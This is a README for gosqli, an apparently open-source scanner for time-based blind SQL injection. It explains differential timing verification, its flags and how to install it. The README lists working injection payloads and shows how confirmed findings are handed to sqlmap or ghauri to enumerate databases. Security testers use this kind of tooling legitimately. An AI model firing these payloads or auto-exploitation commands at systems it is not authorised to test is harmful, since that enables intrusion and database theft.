## gosqli

A fast SQL injection scanner with **zero false positives** using differential timing verification and automatic parameter detection.

## Features

- **Zero False Positives**: Uses differential timing verification (tests SLEEP(5) vs SLEEP(10) and compares the difference)
- **Auto-Parameter Detection**: Automatically tests each URL parameter - no manual `*` placement needed
- **Time-based Blind SQL Injection Detection**: Uses response time delays to detect SQL injection vulnerabilities
- **Multiple Input Methods**:
  - Single URL scanning (`-u`)
  - Multiple URL scanning from file (`-l/--list`)
  - HTTP request file scanning (`-r/--request`) - supports single file or directory
- **Parallel & Concurrent Scanning**: Configurable parallel URL scanning and concurrent payload testing
- **Automatic Exploitation**: Integrates with sqlmap and ghauri for automatic exploitation
- **Proxy Support**: Route requests through proxy servers (e.g., Burp Suite)
- **Request File Support**: Parse and test HTTP requests from files with injection markers

## How Zero False Positives Work

The tool uses **Differential Timing Verification**:

1. **Initial Detection**: If response time exceeds threshold (default 10s), potential SQLi found
2. **Differential Test**:
   - Sends payload with SLEEP(5) - measures response time
   - Sends payload with SLEEP(10) - measures response time
   - Calculates difference between the two times
3. **Verification**:
   - **Real SQLi**: difference = ~5 seconds (SLEEP scales proportionally)
   - **False Positive**: difference = random (network latency doesn't scale with SLEEP value)

```
SQLI FOUND: https://example.com/page?id=123' [200] [10.45 s]
SQLI CONFIRMED: https://example.com/page?id=123' [Differential: SLEEP(5)=5.28s, SLEEP(10)=10.27s, diff=5.00s (expected=5s)]
```

## Auto-Parameter Detection

No need to manually add `*` to URLs. The tool automatically detects and tests each parameter:

```bash
# Input URL
https://example.com/page?id=123&name=test

# Tool automatically tests:
# - id parameter: https://example.com/page?id=123[PAYLOAD]&name=test
# - name parameter: https://example.com/page?id=123&name=test[PAYLOAD]
```

**Original parameter values are preserved** - payloads are appended after them.

## Installation

### Using Go Install
```bash
go install github.com/rix4uni/gosqli@latest
```

### Download Prebuilt Binaries
```bash
wget https://github.com/rix4uni/gosqli/releases/download/v0.0.2/gosqli-linux-amd64-0.0.2.tgz
tar -xvzf gosqli-linux-amd64-0.0.2.tgz
rm -rf gosqli-linux-amd64-0.0.2.tgz
mv gosqli ~/go/bin/gosqli
```

Or download [binary release](https://github.com/rix4uni/gosqli/releases) for your platform.

### Compile from Source
```bash
git clone --depth 1 https://github.com/rix4uni/gosqli.git
cd gosqli; go install
```

## Usage

### Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-u, --url` | Single URL to test | - |
| `-l, --list` | File containing URLs | - |
| `-r, --request` | HTTP request file or directory | - |
| `-p, --payload` | Payload file | - |
| `-m, --mrt` | Match response time threshold (seconds) | 10 |
| `-v, --verify` | Number of verification attempts | 3 |
| `-c, --requiredCount` | Required matches for confirmation (0=all) | 0 |
| `-d, --verifydelay` | Delay between verifications (ms) | 12000 |
| `--retries` | Retry failed requests | 0 |
| `--stop` | Stop after N confirmed SQLi per URL (0=all) | 1 |
| `-P, --parallel` | Parallel URL scanning | 1 |
| `--concurrency` | Concurrent payload testing | 20 |
| `--tolerance` | Timing tolerance for differential verification (seconds) | 2.0 |
| `--proxy` | Proxy URL (e.g., http://127.0.0.1:8080) | - |
| `-o, --output` | Save confirmed results to files | false |
| `--on-confirmed` | Auto-exploit: sqlmap, ghauri, both, none | ghauri |
| `-H` | Custom User-Agent header | Chrome UA |
| `--no-color` | Disable colored output | false |
| `--silent` | Silent mode (no banner) | false |

## Usage Examples

### Basic Scanning (Auto-Parameter Detection)
```bash
# Single URL - automatically tests all parameters
gosqli -u "https://example.com/page?id=123&name=test" -p payloads.txt

# Multiple URLs from file
gosqli -l urls.txt -p payloads.txt
```

### Manual Injection Point
```bash
# Use * to specify custom injection point
gosqli -u "https://example.com/page?id=123*&name=test" -p payloads.txt
```

### HTTP Request File Scanning
```bash
# Single request file
gosqli -r request.txt -p payloads.txt

# Directory of request files
gosqli -r ./burprequest/ -p payloads.txt
```

### With Output Saving
```bash
gosqli -u "https://example.com/page?id=123" -p payloads.txt --output
```

### With Automatic Exploitation
```bash
# Auto-launch ghauri on confirmed SQLi (default)
gosqli -u "https://example.com/page?id=123" -p payloads.txt --on-confirmed ghauri

# Auto-launch sqlmap
gosqli -u "https://example.com/page?id=123" -p payloads.txt --on-confirmed sqlmap

# Launch both
gosqli -u "https://example.com/page?id=123" -p payloads.txt --on-confirmed both

# Disable auto-exploitation
gosqli -u "https://example.com/page?id=123" -p payloads.txt --on-confirmed none
```

### With Proxy (Burp Suite)
```bash
gosqli -u "https://example.com/page?id=123" -p payloads.txt --proxy http://127.0.0.1:8080
```

### Parallel Scanning with Custom Settings
```bash
gosqli -l urls.txt -p payloads.txt -P 5 --concurrency 50 -m 5 --tolerance 3.0 --output
```

### Oneliner Workflow
```bash
echo "example.com" | waybackurls | urldedupe -s | gosqli -l - -p payloads.txt --output
```

## Output Files

When using the `--output` flag, confirmed SQL injection findings are saved to `~/.config/gosqli/`:

```
~/.config/gosqli/
├── sqliconfirmed.burpsuite        # URLs with actual payloads
├── sqliconfirmed.sqlmap_ghauri    # URLs with * markers
├── sqliconfirmed_request/
│   ├── burpsuite/                 # Request files with payloads
│   └── sqlmap_ghauri/             # Request files with * markers
└── logs/                          # Exploitation tool logs
```

## Example Payload File

```
' AND SLEEP(10)--
' OR SLEEP(10)--
1' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--
';WAITFOR DELAY '0:0:10'--
'||pg_sleep(10)--
'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
```

**Note**: Payloads can contain `ADDTIME` placeholder which will be replaced with `10`.

## Output Examples

```
NORMAL REQUEST: https://example.com/page?id=123&name=test [200] [nginx] [0.25 s]
NOT FOUND: https://example.com/page?id=123' AND SLEEP(10)--&name=test [200] [nginx] [0.26 s]
SQLI FOUND: https://example.com/page?id=123'XOR(sleep(10))XOR'&name=test [200] [nginx] [10.28 s]
SQLI CONFIRMED: https://example.com/page?id=123'XOR(sleep(10))XOR'&name=test [200] [nginx] [Differential: SLEEP(5)=5.28s, SLEEP(10)=10.27s, diff=5.00s (expected=5s)]
```

### False Positive Detection
```
SQLI FOUND: https://slow-server.com/page?id=123' [200] [12.45 s]
SQLI FP (Differential): https://slow-server.com/page?id=123' [Differential: SLEEP(5)=12.10s, SLEEP(10)=12.89s, diff=0.79s (expected=5s)]
```

## Important Notes

### Injection Marker
- Use `*` for manual injection point specification
- Without `*`, all parameters are automatically tested
- Example: `http://example.com/page.php?id=1*` (manual) vs `http://example.com/page.php?id=1` (auto)

### Request File Format
```
GET /page.php?id=1* HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0...
Cookie: session=abc123

```

### Tool Integration
- **sqlmap**: `sqlmap -u <url> --random-agent --level 5 --risk 3 --ignore-code=500 --dbs -time-sec=12 --batch --flush-session`
- **ghauri**: `ghauri -u <url> --level 3 --dbs --time-sec 12 --batch --flush-session`

## Acknowledgments

- Integrates with [sqlmap](https://github.com/sqlmapproject/sqlmap) and [ghauri](https://github.com/r0oth3x49/ghauri) for exploitation
